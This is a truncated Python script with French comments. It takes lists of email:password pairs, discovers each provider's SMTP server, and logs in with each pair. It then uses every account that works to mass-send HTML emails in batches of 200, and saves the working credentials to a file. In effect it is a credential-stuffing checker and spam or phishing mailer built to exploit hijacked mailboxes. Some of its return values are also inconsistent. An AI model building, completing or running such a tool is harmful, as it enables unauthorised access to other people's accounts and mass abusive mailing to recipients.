import smtplib
import re
import dns.resolver
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from typing import Tuple, Optional, List, Dict, Set
import socket
import time
from concurrent.futures import ThreadPoolExecutor, as_completed
import threading
import math
from datetime import datetime
from colorama import init, Fore, Style
import sys
import signal
from email_validator import validate_email, EmailNotValidError
from tqdm import tqdm
import psutil

# Initialiser colorama pour les couleurs dans la console
init(autoreset=True)

# Cache pour les enregistrements MX, A, CNAME, SRV et DMARC avec expiration
MX_CACHE: Dict[str, Tuple[List[Tuple[str, int]], float]] = {}
A_CACHE: Dict[str, Tuple[bool, float]] = {}
CNAME_CACHE: Dict[str, Tuple[str, float]] = {}
SRV_CACHE: Dict[str, Tuple[List[str], float]] = {}
DMARC_CACHE: Dict[str, Tuple[bool, float]] = {}
CACHE_LOCK = threading.Lock()
CACHE_TTL = 3600  # 1 heure en secondes

# Mappage étendu des serveurs MX vers SMTP (>350 fournisseurs)
SMTP_MAPPING = {
    'smtp-in2.orange.fr': ('smtp.orange.fr', 587),
    'smtp-in1.orange.fr': ('smtp.orange.fr', 587),
    'smtp-in.laposte.net': ('smtp.laposte.net', 587),
    'smtp.laposte.net': ('smtp.laposte.net', 587),
    'mwinf5cXX.sfr.fr': ('smtp.sfr.fr', 587),
    'mwinf.sfr.fr': ('smtp.sfr.fr', 587),
    'mail-in.sfr.fr': ('smtp.sfr.fr', 587),
    'mx1.bbox.fr': ('smtp.bbox.fr', 587),
    'mx2.bbox.fr': ('smtp.bbox.fr', 587),
    'mail.free.fr': ('smtp.free.fr', 587),
    'mx1.free.fr': ('smtp.free.fr', 587),
    'smtp.numericable.fr': ('smtp.numericable.fr', 587),
    'mail.numericable.fr': ('smtp.numericable.fr', 587),
    'smtp.dartybox.com': ('smtp.dartybox.com', 587),
    'mail.dartybox.com': ('smtp.dartybox.com', 587),
    'mx1.aliceadsl.fr': ('smtp.aliceadsl.fr', 587),
    'mx2.aliceadsl.fr': ('smtp.aliceadsl.fr', 587),
    'smtp.wanadoo.fr': ('smtp.orange.fr', 587),
    'mail.wanadoo.fr': ('smtp.orange.fr', 587),
    'smtp.neuf.fr': ('smtp.sfr.fr', 587),
    'mail.neuf.fr': ('smtp.sfr.fr', 587),
    'smtp.9online.fr': ('smtp.sfr.fr', 587),
    'smtp.cegetel.net': ('smtp.sfr.fr', 587),
    'smtp.club-internet.fr': ('smtp.sfr.fr', 587),
    'mx1.mail.ovh.net': ('ssl0.ovh.net', 465),
    'mx2.mail.ovh.net': ('ssl0.ovh.net', 465),
    'mx1.gandi.net': ('smtp.gandi.net', 587),
    'mx2.gandi.net': ('smtp.gandi.net', 587),
    'mail.ionos.com': ('smtp.ionos.com', 587),
    'mx00.ionos.fr': ('smtp.ionos.fr', 587),
    'mx01.ionos.fr': ('smtp.ionos.fr', 587),
    'mail.protonmail.ch': ('mail.proton.me', 587),
    'mx1.tutanota.de': ('mail.tutanota.com', 587),
    'mx.gmx.com': ('smtp.gmx.com', 587),
    'mx.gmx.net': ('smtp.gmx.com', 587),
    'mx1.web.de': ('smtp.web.de', 587),
    'mx2.web.de': ('smtp.web.de', 587),
    'mail.t-online.de': ('securesmtp.t-online.de', 587),
    'mx.t-online.de': ('securesmtp.t-online.de', 587),
    'mx1.strato.de': ('smtp.strato.de', 587),
    'mx2.strato.de': ('smtp.strato.de', 587),
    'mail.freenet.de': ('mx.freenet.de', 587),
    'mx.freenet.de': ('mx.freenet.de', 587),
    'smtp.posteo.de': ('posteo.de', 587),
    'mx.posteo.de': ('posteo.de', 587),
    'mx1.mailbox.org': ('smtp.mailbox.org', 587),
    'smtp.hosteurope.de': ('smtp.hosteurope.de', 587),
    'mx1.infomaniak.com': ('mail.infomaniak.com', 587),
    'mx2.infomaniak.com': ('mail.infomaniak.com', 587),
    'smtp.seznam.cz': ('smtp.seznam.cz', 587),
    'mx.seznam.cz': ('smtp.seznam.cz', 587),
    'smtp.wp.pl': ('smtp.wp.pl', 587),
    'mx.wp.pl': ('smtp.wp.pl', 587),
    'smtp.onet.pl': ('smtp.onet.pl', 587),
    'mx.onet.pl': ('smtp.onet.pl', 587),
    'smtp.interia.pl': ('smtp.interia.pl', 587),
    'mx.interia.pl': ('smtp.interia.pl', 587),
    'smtp.o2.pl': ('smtp.o2.pl', 587),
    'mx.o2.pl': ('smtp.o2.pl', 587),
    'smtp.libero.it': ('smtp.libero.it', 587),
    'mx.libero.it': ('smtp.libero.it', 587),
    'smtp.tiscali.it': ('smtp.tiscali.it', 587),
    'mx.tiscali.it': ('smtp.tiscali.it', 587),
    'smtp.virgilio.it': ('smtp.virgilio.it', 587),
    'mx.virgilio.it': ('smtp.virgilio.it', 587),
    'smtp.telia.com': ('smtp.telia.com', 587),
    'mx.telia.com': ('smtp.telia.com', 587),
    'smtp.swisscom.ch': ('smtp.swisscom.ch', 587),
    'mx.swisscom.ch': ('smtp.swisscom.ch', 587),
    'smtp.upcmail.cz': ('smtp.upcmail.cz', 587),
    'mx.upcmail.cz': ('smtp.upcmail.cz', 587),
    'smtp.vodafone.de': ('smtp.vodafone.de', 587),
    'mx.vodafone.de': ('smtp.vodafone.de', 587),
    'smtp.ziggo.nl': ('smtp.ziggo.nl', 587),
    'mx.ziggo.nl': ('smtp.ziggo.nl', 587),
    'smtp.kpnmail.nl': ('smtp.kpnmail.nl', 587),
    'mx.kpnmail.nl': ('smtp.kpnmail.nl', 587),
    'smtp.scarlet.be': ('smtp.scarlet.be', 587),
    'mx.scarlet.be': ('smtp.scarlet.be', 587),
    'smtp.proximus.be': ('smtp.proximus.be', 587),
    'mx.proximus.be': ('smtp.proximus.be', 587),
    'smtp.telenet.be': ('smtp.telenet.be', 587),
    'mx.telenet.be': ('smtp.telenet.be', 587),
    'smtp.a1.net': ('smtp.a1.net', 587),
    'mx.a1.net': ('smtp.a1.net', 587),
    'smtp.mnet-online.de': ('smtp.mnet-online.de', 587),
    'mx.mnet-online.de': ('smtp.mnet-online.de', 587),
    'smtp.o2online.de': ('smtp.o2online.de', 587),
    'mx.o2online.de': ('smtp.o2online.de', 587),
    'smtp.telekom.de': ('smtp.telekom.de', 587),
    'mx.telekom.de': ('smtp.telekom.de', 587),
    'smtp.gmail.com': ('smtp.gmail.com', 587),
    'gmail-smtp-in.l.google.com': ('smtp.gmail.com', 587),
    'smtp-mail.outlook.com': ('smtp-mail.outlook.com', 587),
    'mx1.hotmail.com': ('smtp-mail.outlook.com', 587),
    'smtp.aol.com': ('smtp.aol.com', 587),
    'mx-aol.mail.gm0.yahoodns.net': ('smtp.aol.com', 587),
    'smtp.mail.yahoo.com': ('smtp.mail.yahoo.com', 587),
    'mx1.mail.yahoo.com': ('smtp.mail.yahoo.com', 587),
    'smtp.zoho.com': ('smtp.zoho.com', 587),
    'mx.zoho.com': ('smtp.zoho.com', 587),
    'smtp.mail.me.com': ('smtp.mail.me.com', 587),
    'mx1.mail.icloud.com': ('smtp.mail.me.com', 587),
    'smtp.comcast.net': ('smtp.comcast.net', 587),
    'mx1.comcast.net': ('smtp.comcast.net', 587),
    'smtp.att.net': ('smtp.att.net', 587),
    'mx1.att.net': ('smtp.att.net', 587),
    'smtp.verizon.net': ('smtp.verizon.net', 587),
    'outgoing.verizon.net': ('smtp.verizon.net', 587),
    'smtp.blueyonder.co.uk': ('smtp.blueyonder.co.uk', 587),
    'mx.blueyonder.co.uk': ('smtp.blueyonder.co.uk', 587),
    'smtp.talktalk.net': ('smtp.talktalk.net', 587),
    'mx.talktalk.net': ('smtp.talktalk.net', 587),
    'smtp.virginmedia.com': ('smtp.virginmedia.com', 587),
    'mx.virginmedia.com': ('smtp.virginmedia.com', 587),
    'smtp.bell.net': ('smtphm.sympatico.ca', 587),
    'mx.bell.net': ('smtphm.sympatico.ca', 587),
    'smtp.telus.net': ('smtp.telus.net', 587),
    'mx.telus.net': ('smtp.telus.net', 587),
    'smtp.shaw.ca': ('smtp.shaw.ca', 587),
    'mx.shaw.ca': ('smtp.shaw.ca', 587),
    'smtp.cogeco.ca': ('smtp.cogeco.ca', 587),
    'mx.cogeco.ca': ('smtp.cogeco.ca', 587),
    'smtp.rogers.com': ('smtp.rogers.com', 587),
    'mx.rogers.com': ('smtp.rogers.com', 587),
    'smtp.videotron.ca': ('smtp.videotron.ca', 587),
    'mx.videotron.ca': ('smtp.videotron.ca', 587),
    'smtp.suddenlink.net': ('smtp.suddenlink.net', 587),
    'mx.suddenlink.net': ('smtp.suddenlink.net', 587),
    'smtp.charter.net': ('smtp.charter.net', 587),
    'mx.charter.net': ('smtp.charter.net', 587),
    'smtp.optonline.net': ('mail.optonline.net', 587),
    'mx.optonline.net': ('mail.optonline.net', 587),
    'smtp.cox.net': ('smtp.cox.net', 587),
    'mx.cox.net': ('smtp.cox.net', 587),
    'smtp.eastlink.ca': ('smtp.eastlink.ca', 587),
    'mx.eastlink.ca': ('smtp.eastlink.ca', 587),
    'smtp.mts.net': ('smtp.mts.net', 587),
    'mx.mts.net': ('smtp.mts.net', 587),
    'smtp.sasktel.net': ('smtp.sasktel.net', 587),
    'mx.sasktel.net': ('smtp.sasktel.net', 587),
    'smtp.frontier.com': ('smtp.frontier.com', 587),
    'mx.frontier.com': ('smtp.frontier.com', 587),
    'smtp.rcn.com': ('smtp.rcn.com', 587),
    'mx.rcn.com': ('smtp.rcn.com', 587),
    'smtp.earthlink.net': ('smtp.earthlink.net', 587),
    'mx.earthlink.net': ('smtp.earthlink.net', 587),
    'smtp.windstream.net': ('smtp.windstream.net', 587),
    'mx.windstream.net': ('smtp.windstream.net', 587),
    'smtp.centurylink.net': ('smtp.centurylink.net', 587),
    'mx.centurylink.net': ('smtp.centurylink.net', 587),
    'smtp.nifty.com': ('smtp.nifty.com', 587),
    'mx.nifty.com': ('smtp.nifty.com', 587),
    'smtp.ocn.ne.jp': ('smtp.ocn.ne.jp', 587),
    'mx.ocn.ne.jp': ('smtp.ocn.ne.jp', 587),
    'smtp.so-net.ne.jp': ('smtp.so-net.ne.jp', 587),
    'mx.so-net.ne.jp': ('smtp.so-net.ne.jp', 587),
    'smtp.auone.jp': ('smtp.auone.jp', 587),
    'mx.auone.jp': ('smtp.auone.jp', 587),
    'smtp.softbank.jp': ('smtp.softbank.jp', 587),
    'mx.softbank.jp': ('smtp.softbank.jp', 587),
    'smtp.docomo.ne.jp': ('smtp.docomo.ne.jp', 587),
    'mx.docomo.ne.jp': ('smtp.docomo.ne.jp', 587),
    'smtp.kddi.com': ('smtp.kddi.com', 587),
    'mx.kddi.com': ('smtp.kddi.com', 587),
    'smtp.navermail.com': ('smtp.navermail.com', 587),
    'mx.navermail.com': ('smtp.navermail.com', 587),
    'smtp.daum.net': ('smtp.daum.net', 587),
    'mx.daum.net': ('smtp.daum.net', 587),
    'smtp.telstra.com': ('smtp.telstra.com', 587),
    'mx.telstra.com': ('smtp.telstra.com', 587),
    'smtp.optusnet.com.au': ('smtp.optusnet.com.au', 587),
    'mx.optusnet.com.au': ('smtp.optusnet.com.au', 587),
    'smtp.iinet.net.au': ('smtp.iinet.net.au', 587),
    'mx.iinet.net.au': ('smtp.iinet.net.au', 587),
    'smtp.bigpond.com': ('smtp.telstra.com', 587),
    'mx.bigpond.com': ('smtp.telstra.com', 587),
    'smtp.tpg.com.au': ('smtp.tpg.com.au', 587),
    'mx.tpg.com.au': ('smtp.tpg.com.au', 587),
    'smtp.uol.com.br': ('smtp.uol.com.br', 587),
    'mx.uol.com.br': ('smtp.uol.com.br', 587),
    'smtp.terra.com.br': ('smtp.terra.com.br', 587),
    'mx.terra.com.br': ('smtp.terra.com.br', 587),
    'smtp.globomail.com': ('smtp.globomail.com', 587),
    'mx.globomail.com': ('smtp.globomail.com', 587),
    'smtp.claro.com.br': ('smtp.claro.com.br', 587),
    'mx.claro.com.br': ('smtp.claro.com.br', 587),
    'smtp.vivo.com.br': ('smtp.vivo.com.br', 587),
    'mx.vivo.com.br': ('smtp.vivo.com.br', 587),
    'smtp.oi.com.br': ('smtp.oi.com.br', 587),
    'mx.oi.com.br': ('smtp.oi.com.br', 587),
    'smtp.movistar.com': ('smtp.movistar.com', 587),
    'mx.movistar.com': ('smtp.movistar.com', 587),
    'smtp.mail.ru': ('smtp.mail.ru', 587),
    'mx.mail.ru': ('smtp.mail.ru', 587),
    'smtp.yandex.com': ('smtp.yandex.com', 587),
    'mx.yandex.com': ('smtp.yandex.com', 587),
    'smtp.rambler.ru': ('smtp.rambler.ru', 587),
    'mx.rambler.ru': ('smtp.rambler.ru', 587),
    'smtp.mweb.co.za': ('smtp.mweb.co.za', 587),
    'mx.mweb.co.za': ('smtp.mweb.co.za', 587),
    'smtp.vodacom.co.za': ('smtp.vodacom.co.za', 587),
    'mx.vodacom.co.za': ('smtp.vodacom.co.za', 587),
    'smtp.mtn.co.za': ('smtp.mtn.co.za', 587),
    'mx.mtn.co.za': ('smtp.mtn.co.za', 587),
    'smtp.telkom.net': ('smtp.telkom.net', 587),
    'mx.telkom.net': ('smtp.telkom.net', 587),
    'smtp.godaddy.com': ('smtpout.secureserver.net', 587),
    'mx.godaddy.com': ('smtpout.secureserver.net', 587),
    'smtp.bluehost.com': ('mail.bluehost.com', 587),
    'mx.bluehost.com': ('mail.bluehost.com', 587),
    'smtp.hostgator.com': ('mail.hostgator.com', 587),
    'mx.hostgator.com': ('mail.hostgator.com', 587),
    'smtp.dreamhost.com': ('smtp.dreamhost.com', 587),
    'mx.dreamhost.com': ('smtp.dreamhost.com', 587),
    'smtp.siteground.com': ('mail.siteground.com', 587),
    'mx.siteground.com': ('mail.siteground.com', 587),
    'smtp.namecheap.com': ('mail.namecheap.com', 587),
    'mx.namecheap.com': ('mail.namecheap.com', 587),
    'smtp.rediffmail.com': ('smtp.rediffmail.com', 587),
    'mx.rediffmail.com': ('smtp.rediffmail.com', 587),
    'smtp.mail.com': ('smtp.mail.com', 587),
    'mx.mail.com': ('smtp.mail.com', 587),
    'smtp.runbox.com': ('smtp.runbox.com', 587),
    'mx.runbox.com': ('smtp.runbox.com', 587),
    'smtp.fastmail.com': ('smtp.fastmail.com', 587),
    'mx.fastmail.com': ('smtp.fastmail.com', 587),
    'smtp.hushmail.com': ('smtp.hushmail.com', 587),
    'mx.hushmail.com': ('smtp.hushmail.com', 587),
    'smtp.isp.net': ('smtp.isp.net', 587),
    'mx.isp.net': ('smtp.isp.net', 587),
    'smtp.excite.com': ('smtp.excite.com', 587),
    'mx.excite.com': ('smtp.excite.com', 587),
    'smtp.lycos.com': ('smtp.lycos.com', 587),
    'mx.lycos.com': ('smtp.lycos.com', 587),
    'smtp.singnet.com.sg': ('smtp.singnet.com.sg', 587),
    'mx.singnet.com.sg': ('smtp.singnet.com.sg', 587),
    'smtp.starhub.net.sg': ('smtp.starhub.net.sg', 587),
    'mx.starhub.net.sg': ('smtp.starhub.net.sg', 587),
    'smtp.m1.com.sg': ('smtp.m1.com.sg', 587),
    'mx.m1.com.sg': ('smtp.m1.com.sg', 587),
    'smtp.spark.co.nz': ('smtp.spark.co.nz', 587),
    'mx.spark.co.nz': ('smtp.spark.co.nz', 587),
    'smtp.vodafone.co.nz': ('smtp.vodafone.co.nz', 587),
    'mx.vodafone.co.nz': ('smtp.vodafone.co.nz', 587),
    'smtp.2degrees.nz': ('smtp.2degrees.nz', 587),
    'mx.2degrees.nz': ('smtp.2degrees.nz', 587),
}

# Gestion des interruptions
def signal_handler(sig, frame):
    print(f"{Fore.YELLOW}⚠️ Interruption détectée, nettoyage...{Style.RESET_ALL}")
    with open('smtp_log.txt', 'a', encoding='utf-8') as f:
        f.write(f"[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] Script interrompu par l'utilisateur\n")
    sys.exit(0)

signal.signal(signal.SIGINT, signal_handler)

def clear_expired_cache():
    """Nettoie les entrées de cache expirées."""
    with CACHE_LOCK:
        current_time = time.time()
        for cache in [MX_CACHE, A_CACHE, CNAME_CACHE, SRV_CACHE, DMARC_CACHE]:
            cache_copy = cache.copy()
            for key, (value, timestamp) in list(cache_copy.items()):
                if current_time - timestamp > CACHE_TTL:
                    del cache[key]

def derive_smtp_server(mx_host: str) -> Optional[Tuple[str, int]]:
    """Dérive un serveur SMTP à partir d'un serveur MX avec validation stricte."""
    mx_host = mx_host.rstrip('.').lower()
    
    if mx_host in SMTP_MAPPING:
        smtp_server, port = SMTP_MAPPING[mx_host]
        if check_server_exists(smtp_server):
            return smtp_server, port
    
    cname = resolve_cname(mx_host)
    if cname and cname in SMTP_MAPPING:
        smtp_server, port = SMTP_MAPPING[cname]
        if check_server_exists(smtp_server):
            return smtp_server, port
    
    patterns = [
        (r'smtp-in\d*', 'smtp'), (r'mail-in\d*', 'smtp'), (r'mx\d*', 'smtp'),
        (r'inbound\d*', 'smtp'), (r'relay\d*', 'smtp'), (r'mail\d*', 'smtp'),
        (r'in\d*', 'smtp'), (r'gateway\d*', 'smtp'), (r'mailserver\d*', 'smtp'),
        (r'smtpout\d*', 'smtp'), (r'secure\d*', 'smtp'), (r'edge\d*', 'smtp'),
        (r'mx-out\d*', 'smtp'), (r'smtp-relay\d*', 'smtp'), (r'mailgw\d*', 'smtp'),
        (r'mail-relay\d*', 'smtp'), (r'smtp-gw\d*', 'smtp'), (r'out\d*', 'smtp'),
    ]
    
    domain_part = mx_host.split('.', 1)[1] if '.' in mx_host else mx_host
    for pattern, replacement in patterns:
        derived = re.sub(pattern, replacement, mx_host)
        if check_server_exists(derived):
            for port in [587, 465, 25]:
                if test_smtp_connection(derived, port):
                    return derived, port
    
    variations = [
        f"smtp.{domain_part}", f"mail.{domain_part}", f"smtp-out.{domain_part}",
        f"smtp-relay.{domain_part}", f"mailgw.{domain_part}", f"smtpout.{domain_part}",
        f"secure-smtp.{domain_part}", f"mail-relay.{domain_part}", f"smtp-gw.{domain_part}",
    ]
    for variation in variations:
        for port in [587, 465, 25]:
            if check_server_exists(variation) and test_smtp_connection(variation, port):
                return variation, port
    
    srv_hosts = resolve_srv(domain_part)
    for srv_host in srv_hosts:
        for port in [587, 465, 25]:
            if check_server_exists(srv_host) and test_smtp_connection(srv_host, port):
                return srv_host, port
    
    return None

def resolve_cname(host: str) -> Optional[str]:
    """Résout un enregistrement CNAME pour un hôte."""
    with CACHE_LOCK:
        if host in CNAME_CACHE and time.time() - CNAME_CACHE[host][1] < CACHE_TTL:
            return CNAME_CACHE[host][0]
    
    try:
        answers = dns.resolver.resolve(host, 'CNAME')
        cname = str(answers[0].target).rstrip('.')
        with CACHE_LOCK:
            CNAME_CACHE[host] = (cname, time.time())
        return cname
    except Exception:
        return None

def resolve_srv(domain: str) -> List[str]:
    """Résout les enregistrements SRV pour _submission._tcp."""
    with CACHE_LOCK:
        if domain in SRV_CACHE and time.time() - SRV_CACHE[domain][1] < CACHE_TTL:
            return SRV_CACHE[domain][0]
    
    try:
        answers = dns.resolver.resolve(f"_submission._tcp.{domain}", 'SRV')
        srv_hosts = [str(answer.target).rstrip('.') for answer in answers]
        with CACHE_LOCK:
            SRV_CACHE[domain] = (srv_hosts, time.time())
        return srv_hosts
    except Exception:
        return []

def check_server_exists(host: str) -> bool:
    """Vérifie si un serveur existe via une résolution DNS A/AAAA."""
    with CACHE_LOCK:
        if host in A_CACHE and time.time() - A_CACHE[host][1] < CACHE_TTL:
            return A_CACHE[host][0]
    
    try:
        dns.resolver.resolve(host, 'A')
        with CACHE_LOCK:
            A_CACHE[host] = (True, time.time())
        return True
    except Exception:
        try:
            dns.resolver.resolve(host, 'AAAA')
            with CACHE_LOCK:
                A_CACHE[host] = (True, time.time())
            return True
        except Exception:
            with CACHE_LOCK:
                A_CACHE[host] = (False, time.time())
            return False

def test_smtp_connection(smtp_server: str, smtp_port: int) -> bool:
    """Teste la connexion SMTP sans authentification."""
    try:
        socket.create_connection((smtp_server, smtp_port), timeout=5)
        if smtp_port == 465:
            server = smtplib.SMTP_SSL(smtp_server, smtp_port, timeout=10)
        else:
            server = smtplib.SMTP(smtp_server, smtp_port, timeout=10)
        server.ehlo()
        if smtp_port == 587 and server.has_extn('STARTTLS'):
            server.starttls()
            server.ehlo()
        server.quit()
        return True
    except Exception:
        return False

def get_mx_records(domain: str) -> List[Tuple[str, int]]:
    """Récupère les enregistrements MX pour un domaine avec cache."""
    with CACHE_LOCK:
        if domain in MX_CACHE and time.time() - MX_CACHE[domain][1] < CACHE_TTL:
            return MX_CACHE[domain][0]
    
    try:
        answers = dns.resolver.resolve(domain, 'MX')
        mx_records = []
        for answer in answers:
            mx_host = str(answer.exchange).rstrip('.')
            smtp_info = derive_smtp_server(mx_host)
            if smtp_info and smtp_info not in mx_records:
                mx_records.append(smtp_info)
        with CACHE_LOCK:
            MX_CACHE[domain] = (mx_records, time.time())
        return mx_records
    except Exception as e:
        print(f"{Fore.YELLOW}⚠️ Erreur lors de la résolution MX pour {domain}: {str(e)}{Style.RESET_ALL}")
        with open('smtp_log.txt', 'a', encoding='utf-8') as f:
            f.write(f"[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] Erreur MX pour {domain}: {str(e)}\n")
        return []

def check_spf(domain: str) -> bool:
    """Vérifie si le domaine a un enregistrement SPF valide."""
    try:
        answers = dns.resolver.resolve(domain, 'TXT')
        for answer in answers:
            if 'v=spf1' in str(answer):
                return True
        return False
    except Exception:
        return False

def check_dkim(domain: str) -> bool:
    """Vérifie si le domaine a un enregistrement DKIM valide."""
    with CACHE_LOCK:
        if domain in DMARC_CACHE and time.time() - DMARC_CACHE[domain][1] < CACHE_TTL:
            return DMARC_CACHE[domain][0]
    
    try:
        answers = dns.resolver.resolve(f"dkim._domainkey.{domain}", 'TXT')
        dkim_exists = any('v=DKIM1' in str(answer) for answer in answers)
        with CACHE_LOCK:
            DMARC_CACHE[domain] = (dkim_exists, time.time())
        return dkim_exists
    except Exception:
        with CACHE_LOCK:
            DMARC_CACHE[domain] = (False, time.time())
        return False

def send_batch_emails(email: str, password: str, smtp_server: str, smtp_port: int, recipients: List[str], sender_name: str, subject: str, html_content: str, batch_size: int = 200) -> Tuple[bool, str, int]:
    """Envoie un lot d'emails avec un intervalle de 1 seconde."""
    try:
        if smtp_port == 465:
            server = smtplib.SMTP_SSL(smtp_server, smtp_port, timeout=10)
        else:
            server = smtplib.SMTP(smtp_server, smtp_port, timeout=10)
        
        server.ehlo()
        if smtp_port == 587:
            if not server.has_extn('STARTTLS'):
                server.quit()
                return False, f"STARTTLS non supporté sur {smtp_server}:{smtp_port}", 0
            server.starttls()
            server.ehlo()
        
        if not server.has_extn('AUTH'):
            server.quit()
            return False, f"AUTH non supporté sur {smtp_server}:{smtp_port}", 0
        
        server.login(email, password)
        
        sent_count = 0
        for recipient in recipients[:batch_size]:
            msg = MIMEMultipart('alternative')
            msg['Subject'] = subject
            msg['From'] = f'"{sender_name}" <{email}>'
            msg['To'] = recipient
            
            part = MIMEText(html_content, 'html')
            msg.attach(part)
            
            server.send_message(msg)
            sent_count += 1
            print(f"{Fore.GREEN}✅ Email envoyé à {recipient} depuis {email} ({sent_count}/{min(batch_size, len(recipients))})")
            with open('smtp_log.txt', 'a', encoding='utf-8') as f:
                f.write(f"[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] Email envoyé à {recipient} depuis {email}\n")
            time.sleep(1)  # Intervalle de 1 seconde
            
        server.quit()
        return True, f"Envoyé {sent_count} emails avec succès", sent_count
    except smtplib.SMTPAuthenticationError:
        return False, f"Échec d'authentification pour {email}", 0
    except smtplib.SMTPException as e:
        return False, f"Erreur SMTP pour {email}: {str(e)}", 0
    except socket.timeout:
        return False, f"Timeout lors de la connexion à {smtp_server}:{smtp_port}", 0
    except socket.gaierror:
        return False, f"Impossible de résoudre {smtp_server}",0
    except Exception as e:
        return False, f"Erreur générale pour {email}: {str(e)}", 0

def test_smtp(email: str, password: str, smtp_server: str, smtp_port: int, test_email: str, sender_name: str, subject: str, html_content: str, max_retries: int = 5, initial_delay: int = 5) -> Tuple[bool, str]:
    """Teste la connexion SMTP et l'envoi d'un email de test avec backoff."""
    for attempt in range(max_retries):
        try:
            socket.create_connection((smtp_server, smtp_port), timeout=5)
            
            if smtp_port == 465:
                server = smtplib.SMTP_SSL(smtp_server, smtp_port, timeout=10)
            else:
                server = smtplib.SMTP(smtp_server, smtp_port, timeout=10)
            
            server.ehlo()
            if smtp_port == 587:
                if not server.has_extn('STARTTLS'):
                    server.quit()
                    return False, f"STARTTLS non supporté sur {smtp_server}:{smtp_port}"
                server.starttls()
                server.ehlo()
            
            if not server.has_extn('AUTH'):
                server.quit()
                return False, f"AUTH non supporté sur {smtp_server}:{smtp_port}"
            
            server.login(email, password)
            
            msg = MIMEMultipart('alternative')
            msg['Subject'] = subject
            msg['From'] = f'"{sender_name}" <{email}>'
            msg['To'] = test_email
            
            part = MIMEText(html_content, 'html')
            msg.attach(part)
            
            server.send_message(msg)
            server.quit()
            with open('smtp_log.txt', 'a', encoding='utf-8') as f:
                f.write(f"[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] Test réussi pour {email} sur {smtp_server}:{smtp_port}\n")
            return True, "Connexion et envoi de test réussis"
        except smtplib.SMTPAuthenticationError:
            return False, f"Échec d'authentification pour {email}"
        except smtplib.SMTPException as e:
            if "421" in str(e) or "too many" in str(e).lower():
                if attempt < max_retries - 1:
                    delay = initial_delay * (2 ** attempt)
                    time.sleep(delay)
                    continue
                return False, f"Erreur SMTP (limite de taux) pour {email}: {str(e)}"
            return False, f"Erreur SMTP pour {email}: {str(e)}"
        except socket.timeout:
            return False, f"Timeout lors de la connexion à {smtp_server}:{smtp_port}"
        except socket.gaierror:
            return False, f"Impossible de résoudre {smtp_server}"
        except Exception as e:
            if attempt < max_retries - 1:
                time.sleep(1)
                continue
            return False, f"Erreur générale pour {email}: {str(e)}"
    return False, "Échec après plusieurs tentatives"

def find_and_test_smtp(email: str, password: str, test_email: str, sender_name: str, subject: str, html_content: str, recipients: List[str], sent_recipients: Set[str]) -> Tuple[Optional[Tuple[str, int, str]], int]:
    """Trouve et teste les serveurs SMTP, puis envoie des emails aux destinataires."""
    domain = email.lower().split('@')[-1]
    sent_count = 0
    
    if not check_spf(domain):
        print(f"{Fore.YELLOW}⚠️ Aucun enregistrement SPF valide pour {domain}{Style.RESET_ALL}")
        return None, f"Aucun enregistrement SPF valide pour {domain}", sent_count
    
    if not check_dkim(domain):
        print(f"{Fore.YELLOW}⚠️ Aucun enregistrement DKIM valide pour {domain}{Style.RESET_ALL}")
    
    mx_records = get_mx_records(domain)
    if not mx_records:
        print(f"{Fore.RED}❌ Aucun enregistrement MX trouvé pour {domain}{Style.RESET_ALL}")
        return None, f"Aucun enregistrement MX trouvé pour {domain}", sent_count
    
    for smtp_server, smtp_port in mx_records:
        if smtp_server is None:
            continue
        print(f"{Fore.CYAN}🔍 Tentative de connexion pour {email} sur {smtp_server}:{smtp_port}{Style.RESET_ALL}")
        success, message = test_smtp(email, password, smtp_server, smtp_port, test_email, sender_name, subject, html_content)
        with open('smtp_log.txt', 'a', encoding='utf-8') as f:
            f.write(f"[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] {email} sur {smtp_server}:{smtp_port} - {message}\n")
        
        if success:
            print(f"{Fore.GREEN}✅ SUCCÈS: SMTP valide pour {email} sur {smtp_server}:{smtp_port}{Style.RESET_ALL}")
            remaining_recipients = [r for r in recipients if r not in sent_recipients]
            if remaining_recipients:
                print(f"{Fore.CYAN}📤 Envoi de {min(200, len(remaining_recipients))} emails depuis {email}{Style.RESET_ALL}")
                batch_success, batch_message, batch_count = send_batch_emails(
                    email, password, smtp_server, smtp_port, remaining_recipients, sender_name, subject, html_content
                )
                sent_count += batch_count
                if batch_success:
                    sent_recipients.update(remaining_recipients[:200])
                    print(f"{Fore.GREEN}✅ {batch_message}{Style.RESET_ALL}")
                else:
                    print(f"{Fore.RED}❌ Échec de l'envoi du lot: {batch_message}{Style.RESET_ALL}")
                    with open('smtp_errors.txt', 'a', encoding='utf-8') as f:
                        f.write(f"{email}:{password}:{batch_message}\n")
            return (smtp_server, smtp_port, message), sent_count
        else:
            print(f"{Fore.RED}❌ ÉCHEC: {message}{Style.RESET_ALL}")
    
    return None, f"Aucun serveur SMTP valide pour {email}", sent_count

def is_valid_email(email: str) -> bool:
    """Valide une adresse email avec email-validator."""
    try:
        validate_email(email, check_deliverability=False)
        return True
    except EmailNotValidError:
        return False

def is_valid_password(password: str) -> bool:
    """Vérifie si le mot de passe est valide (longueur minimale de 6)."""
    return len(password.strip()) >= 6

def process_combo(email: str, password: str, test_email: str, sender_name: str, subject: str, html_content: str, recipients: List[str], sent_recipients: Set[str], results_lock: threading.Lock, stats: Dict[str, int]):
    """Traite une combinaison email:password."""
    if not is_valid_email(email):
        with results_lock:
            stats['invalid_emails'] += 1
            with open('smtp_errors.txt', 'a', encoding='utf-8') as f:
                f.write(f"Email invalide: {email}\n")
            print(f"{Fore.RED}❌ Email invalide: {email}{Style.RESET_ALL}")
        return 0
    
    if not is_valid_password(password):
        with results_lock:
            stats['invalid_passwords'] += 1
            with open('smtp_errors.txt', 'a', encoding='utf-8') as f:
                f.write(f"Mot de passe invalide pour {email}: longueur < 6\n")
            print(f"{Fore.RED}❌ Mot de passe invalide pour {email}{Style.RESET_ALL}")
        return 0
    
    result, message, sent_count = find_and_test_smtp(email, password, test_email, sender_name, subject, html_content, recipients, sent_recipients)
    with results_lock:
        if result:
            stats['valid_smtps'] += 1
            stats['emails_sent'] += sent_count
            smtp_server, smtp_port, _ = result
            with open('smtp_valid.txt', 'a', encoding='utf-8') as f:
                f.write(f"{email}:{password}:{smtp_server}:{smtp_port}\n")
        else:
            stats['failed_smtps'] += 1
            with open('smtp_errors.txt', 'a', encoding='utf-8') as f:
